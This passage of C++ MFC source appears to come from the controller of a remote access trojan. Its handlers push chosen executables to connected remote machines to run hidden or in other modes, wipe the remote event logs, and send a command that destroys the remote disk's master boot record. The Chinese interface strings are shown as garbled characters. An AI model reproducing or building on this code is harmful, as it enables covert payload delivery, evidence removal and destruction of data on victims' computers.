		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		Name = m_pListCtrl->GetItemText(nItem, 11);
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);	
}

void CPcView::OnAll() 
{
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString Data;
	CString Name;
	while(pos)
	{
		Name = "";
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		for(int i = 0; i < m_pListCtrl->GetHeaderCtrl()-> GetItemCount(); i++)
		{
			Name += m_pListCtrl->GetItemText(nItem, i);
			Name += " ";
		}
		Data += Name;
		Data += "\r\n";
	}
	Data = Data.Left(Data.GetLength() - 2);
	SetClipboardText(Data);	
}

void CPcView::OnStartHide() 
{

	// TODO: Add your command handler code here
	CString strTitle;

	AfxMessageBox("�ϴ���Զ��ϵͳ��Program Files�ļ����£������ļ�����ʱ�������ĵȺ�");

	CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"��ִ���ļ�|*.exe", NULL);
	if(dlg->DoModal () != IDOK) 
		return;
	unsigned char *data = NULL;   
	size_t size;   

	FILE *file=fopen(dlg->GetPathName(),"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("�ļ���ȡʧ�ܣ�");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int		nPacketLength = size + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_HIDE;
	memcpy(lpPacket + 1, data, nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
	delete dlg;

}
void CPcView::OnStartNormal() 
{

	// TODO: Add your command handler code here
	CString strTitle;

    AfxMessageBox("�ϴ���Զ��ϵͳ��Program Files�ļ����£������ļ�����ʱ�������ĵȺ�");

	CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"��ִ���ļ�|*.exe", NULL);
	if(dlg->DoModal () != IDOK) 
		return;
	//	AfxMessageBox(dlg->GetPathName());
	unsigned char *data = NULL;   
	size_t size;   
	
	FILE *file=fopen(dlg->GetPathName(),"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("�ļ���ȡʧ�ܣ�");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int		nPacketLength = size + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_NORMAL;
	memcpy(lpPacket + 1, data, nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
	delete dlg;

}
void CPcView::OnUpdata() 
{

	// TODO: Add your command handler code here
	CString strTitle;

    AfxMessageBox("�ϴ���Զ��ϵͳ��Program Files�ļ����£������ļ�����ʱ�������ĵȺ�");

	CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"��ִ���ļ�|*.exe", NULL);
	if(dlg->DoModal () != IDOK) 
		return;
	unsigned char *data = NULL;   
	size_t size;   
	
	FILE *file=fopen(dlg->GetPathName(),"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("�ļ���ȡʧ�ܣ�");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int		nPacketLength = size + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_UPDATA;
	memcpy(lpPacket + 1, data, nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
	delete dlg;

}
void CPcView::OnNoStart() 
{

	// TODO: Add your command handler code here
	CString strTitle;

    AfxMessageBox("�ϴ���Զ��ϵͳ��Program Files�ļ����£������ļ�����ʱ�������ĵȺ�");
	
	CFileDialog *dlg = new CFileDialog(TRUE, "exe", "*.exe", OFN_HIDEREADONLY,"��ִ���ļ�|*.exe", NULL);
	if(dlg->DoModal () != IDOK) 
		return;
	//	AfxMessageBox(dlg->GetPathName());
	unsigned char *data = NULL;   
	size_t size;   
	
	FILE *file=fopen(dlg->GetPathName(),"rb");
	if (file == NULL)   
	{   
		AfxMessageBox("�ļ���ȡʧ�ܣ�");  
		return;  
	}
	fseek(file, 0, SEEK_END);   
	size = ftell(file);   
	data = (unsigned char *)malloc(size);   
	fseek(file, 0, SEEK_SET);   
	fread(data, 1, size, file);
	fclose(file);
	
	int		nPacketLength = size + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SENDFILE_NOSTART;
	memcpy(lpPacket + 1, data, nPacketLength - 1);
	
	SendSelectCommand(lpPacket, nPacketLength);
	if (data)
		free(data);
	delete[] lpPacket;
	delete dlg;

}

void CPcView::OnAddUser()   //������
{
	BYTE	bToken = COMMAND_SERVER_START;
	SendSelectCommand(&bToken,sizeof(BYTE));
}

void CPcView::OnAqglRz() 
{
	// TODO: Add your command handler code here

	if (MessageBox("�����Ҫɾ����־?", "��ʾ", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_CLEAN_ALL;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnAqglYp()
{
	if (MessageBox("Ӳ�̼������޷���ʽ����ȷ����?", "����", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_KILL_MBR;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));
}

//void CPcView::OnPaint() 
//{
//	CPaintDC dc(this); // device context for painting
//	
//	// TODO: Add your message handler code here
//
//	// Do not call CListView::OnPaint() for painting messages
//}
